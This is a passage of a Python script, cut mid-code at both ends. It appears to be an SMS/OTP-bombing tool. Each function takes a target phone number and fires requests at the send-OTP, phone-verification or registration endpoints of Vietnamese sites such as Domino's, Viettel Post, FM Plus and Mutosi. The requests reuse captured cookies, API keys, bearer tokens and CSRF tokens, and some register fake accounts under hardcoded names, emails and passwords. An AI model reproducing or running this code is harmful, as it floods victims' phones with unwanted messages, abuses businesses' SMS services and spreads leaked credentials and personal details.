    cookies=cookies,
    headers=headers,
    json=json_data,
)
def domi(phone):
    cookies = {
    '_gid': 'GA1.2.1143586587.1720312773',
    '_fbp': 'fb.1.1720312773608.72318382363231927',
    '_gcl_gs': '2.1.k1$i1720312921',
    '_gat_UA-41910789-1': '1',
    '_ga': 'GA1.1.2103093724.1720312773',
    '_ga_12HB7KTL5M': 'GS1.1.1720312772.1.1.1720312932.49.0.0',
    '_ga_8GXKYDTW3R': 'GS1.1.1720312772.1.1.1720312933.0.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '_gid=GA1.2.1143586587.1720312773; _fbp=fb.1.1720312773608.72318382363231927; _gcl_gs=2.1.k1$i1720312921; _gat_UA-41910789-1=1; _ga=GA1.1.2103093724.1720312773; _ga_12HB7KTL5M=GS1.1.1720312772.1.1.1720312932.49.0.0; _ga_8GXKYDTW3R=GS1.1.1720312772.1.1.1720312933.0.0.0',
    'dmn': 'doqkqr',
    'origin': 'https://dominos.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://dominos.vn/promotion-listing/bogo-week-digital-t7',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone_number': phone,
    'email': 'nguyentrongkhai130@gmail.com',
    'type': 0,
    'is_register': True,
}

    response = requests.post('https://dominos.vn/api/v1/users/send-otp', cookies=cookies, headers=headers, json=json_data)
def shop(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '441e8136801b70ac87887bca16dd298f',
    'origin': 'https://thefaceshop.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://thefaceshop.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720623654086',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def fu(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://futabus.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://futabus.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjU2OTFhMTk1YjI0MjVlMmFlZDYwNjMzZDdjYjE5MDU0MTU2Yjk3N2QiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMDYyMDYyMywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIwNjIwNjIzLCJleHAiOjE3MjA2MjQyMjMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.YR8S04KR7mVRqL68o-a-6svQibV5Gpx8ciD-oxmm3zYMYN55FIAzZPkaZ2rlFaNpGwGl5AkuTWgoVVTU5uTttWOADhoWhOMdICkz811oPzQcjVA0VVG2r7Vg6vVOuKdg3jbD6SJ0ySj6Ln96nI-kcy6Q_169sGYxKIGwknsfM91-NnFRi_D_xNulys0i4OxqRdHxpK42VRkzyl0hwj0sS-cd5i84MT8MtiyOZRhn9J89tMLkHVP5NAyDfHtjm3UYmJYbBRQQf-iaT2nu36AZ_dNRT6rtQuqNpk0vyCIEdPo-9t6cKhaW-I69DBcz5d73fleRTM3zHD-5DlJkpkcWKA',
    'x-app-id': 'client',
}

    json_data = {
    'phoneNumber': phone,
    'deviceId': 'e3025fb7-5436-4002-9950-e6564b3656a6',
    'use_for': 'LOGIN',
}

    response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)
def beau(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '584294d68530c7b753d7f5a77c1ddbc2',
    'origin': 'https://beautybox.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://beautybox.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720624059192',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def hoanvu(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '028601f79dcc724ef8b8e7c989c5f649',
    'origin': 'https://reebok.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://reebok.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720624197351',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def tokyo(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://tokyolife.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://tokyolife.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'signature': 'c1336d4c72c0b857cdd6aab4de261aa3',
    'timestamp': '1720624468348',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone_number': phone,
    'name': 'khải nguyễn',
    'password': 'vjyy1234',
    'email': 'trongkhai1118@gmail.com',
    'birthday': '2002-07-10',
    'gender': 'female',
}

    response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data)
def cir(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://circa.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://circa.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': {
        'country_code': '84',
        'phone_number': phone,
    },
}

    response = requests.post('https://api.circa.vn/v1/entity/validation-phone', headers=headers, json=json_data)
def guma(phone):
    headers = {
    'Accept': 'application/json',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://gumac.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://gumac.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'phone': phone,
}

    response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)
def hoang(phone):
    cookies = {
    'PHPSESSID': '023c4d0e7b15edc71f14f346ff4ef829',
    'form_key': 'KELcFD4RySb6WQsc',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-cache-sessid': 'true',
    'mage-messages': '',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'form_key': 'KELcFD4RySb6WQsc',
    '_fbp': 'fb.1.1720626061882.764993913589523922',
    '_pk_ses.564990520.6493': '*',
    '_gcl_gs': '2.1.k1$i1720626054',
    '_gcl_au': '1.1.676093199.1720626062',
    'au_id': '1550063352',
    '_ac_au_gt': '1720626058223',
    '_ga': 'GA1.1.42709150.1720626062',
    '_gcl_aw': 'GCL.1720626063.CjwKCAjw4ri0BhAvEiwA8oo6F2MiLFPQwoa8aYSViFa1OyQnHiLIFOvjgAyZ70q6t5zp2PnA6GbquhoCVgMQAvD_BwE',
    'cdp_session': '1',
    '_asm_visitor_type': 'r',
    'mst-cache-warmer-track': '1720626075588',
    '_asm_ss_view': '%7B%22time%22%3A1720626062220%2C%22sid%22%3A%225182297358166228%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-07-10T15%3A41%3A25%22%2C%22duration%22%3A23213%7D',
    '_ga_48P0WR3P2C': 'GS1.1.1720626062.1.1.1720626086.36.0.0',
    'private_content_version': '5e3e65678616f3e49864dce16d1f43de',
    'section_data_ids': '{}',
    '_pk_id.564990520.6493': '1550063352.1720626062.1.1720626136.1720626062.',
    '_ac_client_id': '1550063352.1720626132',
    '_ac_an_session': 'zmzizrzhzhzqzkzgzmzrzizlzlzhzhzrzdzizmzmzjzjzlzgzgzmzhzdzizkzhzjzlzhzlzizgzhzdzizdzizkzhzjzlzhzlzizgzhzdzizkzhzjzlzhzlzizgzhzdzizdzhznzdzhzd2f27zdzgzdzlzmzmznzqzdzd321v272624',
    'cdp_blocked_sid_17509314': 'true',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=023c4d0e7b15edc71f14f346ff4ef829; form_key=KELcFD4RySb6WQsc; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; form_key=KELcFD4RySb6WQsc; _fbp=fb.1.1720626061882.764993913589523922; _pk_ses.564990520.6493=*; _gcl_gs=2.1.k1$i1720626054; _gcl_au=1.1.676093199.1720626062; au_id=1550063352; _ac_au_gt=1720626058223; _ga=GA1.1.42709150.1720626062; _gcl_aw=GCL.1720626063.CjwKCAjw4ri0BhAvEiwA8oo6F2MiLFPQwoa8aYSViFa1OyQnHiLIFOvjgAyZ70q6t5zp2PnA6GbquhoCVgMQAvD_BwE; cdp_session=1; _asm_visitor_type=r; mst-cache-warmer-track=1720626075588; _asm_ss_view=%7B%22time%22%3A1720626062220%2C%22sid%22%3A%225182297358166228%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-07-10T15%3A41%3A25%22%2C%22duration%22%3A23213%7D; _ga_48P0WR3P2C=GS1.1.1720626062.1.1.1720626086.36.0.0; private_content_version=5e3e65678616f3e49864dce16d1f43de; section_data_ids={}; _pk_id.564990520.6493=1550063352.1720626062.1.1720626136.1720626062.; _ac_client_id=1550063352.1720626132; _ac_an_session=zmzizrzhzhzqzkzgzmzrzizlzlzhzhzrzdzizmzmzjzjzlzgzgzmzhzdzizkzhzjzlzhzlzizgzhzdzizdzizkzhzjzlzhzlzizgzhzdzizkzhzjzlzhzlzizgzhzdzizdzhznzdzhzd2f27zdzgzdzlzmzmznzqzdzd321v272624; cdp_blocked_sid_17509314=true',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6ImQ0YmU4OTUwMTY5YzFjM2IiLCJ0ciI6ImMzNzBjYzJiZTc1ZmQ0OGJmZTJjNDQ4YmM1MWIwMzI2IiwidGkiOjE3MjA2MjYyNzE1NTIsInRrIjoiMTMyMjg0MCJ9fQ==',
    'origin': 'https://hoang-phuc.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://hoang-phuc.com/customer/account/create/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-c370cc2be75fd48bfe2c448bc51b0326-d4be8950169c1c3b-01',
    'tracestate': '1322840@nr=0-1-4173019-1120237972-d4be8950169c1c3b----1720626271552',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'action_type': '1',
    'tel': phone,
}

    response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data)
def fm(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer',
    'cache-control': 'no-cache',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://fm.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://fm.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
    'x-emp': '',
    'x-fromweb': 'true',
    'x-requestid': '9a563626-1886-40ce-a5b2-99971fd53161',
}

    json_data = {
    'Phone': phone,
    'LatOfMap': '106',
    'LongOfMap': '108',
    'Browser': '',
}

    response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)
def vtpost(phone):
    cookies = {
    '_gid': 'GA1.2.620335128.1720627303',
    '_gat_gtag_UA_128396571_2': '1',
    'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
    '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY',
    '_ga_9NGCREH08E': 'GS1.1.1720627303.1.0.1720627304.59.0.0',
    '_gat_gtag_UA_146347905_1': '1',
    '_gat_gtag_UA_142538724_1': '1',
    '_ga_7RZCEBC0S6': 'GS1.1.1720627304.1.1.1720627306.0.0.0',
    '_ga_WN26X24M50': 'GS1.1.1720627305.1.1.1720627306.0.0.0',
    '_ga': 'GA1.1.278441667.1720627303',
    '_ga_P86KBF64TN': 'GS1.1.1720627305.1.1.1720627319.0.0.0',
}

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_gid=GA1.2.620335128.1720627303; _gat_gtag_UA_128396571_2=1; QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY; _ga_9NGCREH08E=GS1.1.1720627303.1.0.1720627304.59.0.0; _gat_gtag_UA_146347905_1=1; _gat_gtag_UA_142538724_1=1; _ga_7RZCEBC0S6=GS1.1.1720627304.1.1.1720627306.0.0.0; _ga_WN26X24M50=GS1.1.1720627305.1.1.1720627306.0.0.0; _ga=GA1.1.278441667.1720627303; _ga_P86KBF64TN=GS1.1.1720627305.1.1.1720627319.0.0.0',
    'Origin': 'null',
    'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'FormRegister.FullName': 'Taylor Jasmine',
    'FormRegister.Phone': phone,
    'FormRegister.Password': 'vjyy1234',
    'FormRegister.ConfirmPassword': 'vjyy1234',
    'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=s7oqj3gkapi06ddxfymrhcs',
    'ConfirmOtpType': 'Register',
    'FormRegister.IsRegisterFromPhone': 'true',
    '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8MNiql6Angxj2aQkKc6E7R0IbTO0WlQgNkTmu1FXJfLeYLf3huG-7Bwm56zhIf_24enfQeQw_ZU0U3j7lUGSruoA3rf6J9q21R09mQjT1SH5SlPYbamWpErWJe9T5YsuQ',
}

    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
def shine(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://30shine.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://30shine.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': phone,
}

    response = requests.post(
    'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
    headers=headers,
    json=json_data,
)
def dkimu(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://mutosi.com',
    'Pragma': 'no-cache',
    'Referer': 'https://mutosi.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'name': 'hà khải',
    'phone': phone,
    'password': 'Vjyy1234@',
    'confirm_password': 'Vjyy1234@',
    'firstname': None,
    'lastname': None,
    'verify_otp': 0,
    'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'email': 'dđ@gmail.com',
    'birthday': '2006-02-13',
    'accept_the_terms': 1,
    'receive_promotion': 1,
}

    response = requests.post('https://api-omni.mutosi.com/client/auth/register', headers=headers, json=json_data)
def otpmu(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://mutosi.com',
    'Pragma': 'no-cache',
    'Referer': 'https://mutosi.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'phone': phone,
    'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
    'source': 'web_consumers',
}

    response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data)

def vina(phone):
    cookies = {
    '_gcl_au': '1.1.998139933.1720624574',
    '_ga': 'GA1.1.50287730.1720624578',
    '_fbp': 'fb.2.1720624579398.521085014509551541',
    '_tt_enable_cookie': '1',
    '_ttp': 'KSqjH4dgnlCZCXFrW8iH9-PBbVv',
    '_gcl_gs': '2.1.k1$i1720624593',
    '_gcl_aw': 'GCL.1720624597.CjwKCAjw4ri0BhAvEiwA8oo6F2TkUVdatYI4tVOobGswn40OdeGgXIg6LXx5FNTWp7uUoRTyudcm1hoCI04QAvD_BwE',
    '_hjSessionUser_2067180': 'eyJpZCI6IjdhM2IwZGI1LTAyYzUtNTk0YS1hYWIxLTUxNGFhMjEzYmMwNyIsImNyZWF0ZWQiOjE3MjA2MjQ1Nzk1NjAsImV4aXN0aW5nIjp0cnVlfQ==',
    'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%223d8858bedb9f88174683e7216ae7f4de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721111592%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D5be85c0c1450958dd4ed204579b830aa',
    '_hjSession_2067180': 'eyJpZCI6IjJiMDkwNzRmLTA2M2YtNDNkOC1hYzljLTk1ZTM4MDU3ODA5NSIsImMiOjE3MjExMTE1OTU0NzgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
    '_clck': '1sxln5m%7C2%7Cfni%7C0%7C1652',
    '__cf_bm': 'lBreB9n2Kjxr5GDN12Z6cP1PU2TCNww1w8ccXp5bzus-1721111653-1.0.1.1-tG3rISwY9rhAXjyBqH8rYZTCWOA9POhBSf1D0X0bFyRdMUnR9K7cmCgu05Xxiho3.bxM00TNCyc6lQ8OcpEhcA',
    'builderSessionId': '7b564e5635c64aa4b60d611b650e05b4',
    'sca_fg_codes': '[]',
    'avadaIsLogin': '',
    '_ga_6NH1HJ4MRS': 'GS1.1.1721111594.2.1.1721111671.44.0.0',
    '_clsk': '1q6ggsm%7C1721111672278%7C4%7C1%7Cv.clarity.ms%2Fcollect',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer null',
    'cache-control': 'no-cache',
    'content-type': 'text/plain;charset=UTF-8',
